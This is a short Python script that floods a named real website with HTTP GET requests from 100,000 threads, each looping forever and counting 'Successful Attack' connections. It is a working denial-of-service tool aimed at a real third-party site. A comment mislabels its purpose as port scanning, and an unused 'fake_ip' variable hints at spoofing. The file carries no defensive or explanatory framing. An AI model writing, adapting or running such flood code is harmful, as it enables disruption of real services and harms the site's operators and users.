import socket
import threading

target = "www.nettruyenmax.com" # The target IP address to scan for open ports.
port =80
# i = 1
fake_ip = "182.21.20.32"
already_connected = 0
def attack():
    global size
    global thread_list
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target,port))
            request = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
            sock.sendall(request.encode("ascii"))
            # sock.close()
            
            global already_connected 
            already_connected = already_connected + 1
            if already_connected % size == 0 :
                print("Successful Attack",already_connected)
                # i = i + 1
        except:
            print("Disconnected!!!") 
size = 100000
thread_list = []                     
def main():
    global size
    global thread_list
    for i in range(size):
        thread = threading.Thread(target=attack)
        # thread.start()
        thread_list.append(thread)
    
    for thread in thread_list:
        thread.start()
    
    for thread in thread_list:
        thread.join()

        
if __name__ == "__main__":
    main()